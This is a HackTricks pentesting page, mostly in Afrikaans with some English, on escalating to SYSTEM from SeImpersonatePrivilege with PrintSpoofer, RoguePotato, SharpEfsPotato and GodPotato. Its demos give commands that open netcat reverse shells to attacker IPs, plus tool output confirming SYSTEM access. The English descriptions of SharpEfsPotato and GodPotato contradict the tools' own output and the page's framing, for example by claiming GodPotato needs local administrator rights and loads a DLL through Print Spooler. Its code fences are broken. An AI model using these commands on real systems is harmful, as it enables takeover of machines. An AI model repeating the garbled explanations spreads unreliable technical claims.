# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

{% hint style="warning" %}
**JuicyPotato werk nie** op Windows Server 2019 en Windows 10-bou 1809 en later nie. Tog kan [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato) gebruik word om dieselfde bevoegdhede te benut en `NT AUTHORITY\SYSTEM`-vlak toegang te verkry. Hierdie [blogpos](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) gaan dieper in op die `PrintSpoofer`-instrument, wat gebruik kan word om impersonasiebevoegdhede op Windows 10- en Server 2019-gashere te misbruik waar JuicyPotato nie meer werk nie.
{% endhint %}

## Vinnige demonstrasie

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
### RoguePotato

{% code overflow="wrap" %}
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
{% code %}

### SharpEfsPotato

SharpEfsPotato is a tool that exploits the EFS (Encrypting File System) service to achieve local privilege escalation on Windows systems. This technique can be used to gain elevated privileges and execute arbitrary code with SYSTEM level permissions.

#### Usage

To use SharpEfsPotato, follow these steps:

1. Download the SharpEfsPotato tool from the official GitHub repository.
2. Compile the source code using a C# compiler.
3. Execute the compiled binary on the target Windows system.

#### How it Works

SharpEfsPotato takes advantage of the EFS service, which is responsible for encrypting files on Windows systems. By creating a symbolic link to a target file, SharpEfsPotato can trick the EFS service into decrypting the file and executing arbitrary code with SYSTEM level permissions.

#### Mitigation

To mitigate the risk of SharpEfsPotato and similar attacks, follow these recommendations:

1. Regularly update and patch your Windows systems to ensure they have the latest security updates.
2. Implement strong access controls and permissions on sensitive files and directories.
3. Monitor and log EFS-related events to detect any suspicious activity.
4. Consider disabling the EFS service if it is not required for your organization's operations.

#### Conclusion

SharpEfsPotato is a powerful tool for local privilege escalation on Windows systems. It exploits the EFS service to gain elevated privileges and execute arbitrary code with SYSTEM level permissions. By following the mitigation recommendations, you can reduce the risk of such attacks and enhance the security of your Windows environment.

{% endcode %}
```
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### GodPotato

GodPotato is a technique that combines the RoguePotato and PrintSpoofer exploits to achieve local privilege escalation on Windows systems. This technique takes advantage of the Windows Print Spooler service and its ability to load DLL files.

To execute the GodPotato attack, the attacker needs to have local administrator privileges on the target system. The attack involves the following steps:

1. First, the attacker needs to download and compile the RoguePotato exploit. This exploit abuses the COM object hijacking vulnerability in the Windows COM infrastructure.

2. Once the RoguePotato exploit is compiled, the attacker can execute it on the target system. This exploit will create a malicious DLL file and register it as a COM object.

3. After registering the malicious DLL, the attacker needs to download and compile the PrintSpoofer exploit. PrintSpoofer is a tool that allows the attacker to impersonate the SYSTEM account and gain elevated privileges.

4. With the PrintSpoofer exploit compiled, the attacker can execute it on the target system. This exploit will leverage the Print Spooler service to load the previously registered malicious DLL.

5. As a result, the attacker will gain elevated privileges on the target system, effectively escalating their access from a regular user to a local administrator.

It is important to note that the GodPotato technique requires local administrator privileges to be successful. Additionally, this technique can be detected and mitigated by applying the necessary security patches and configurations recommended by Microsoft.
```
GodPotato -cmd "cmd /c whoami"
GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
## Verwysings
* [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
* [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
* [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
* [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
* [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>
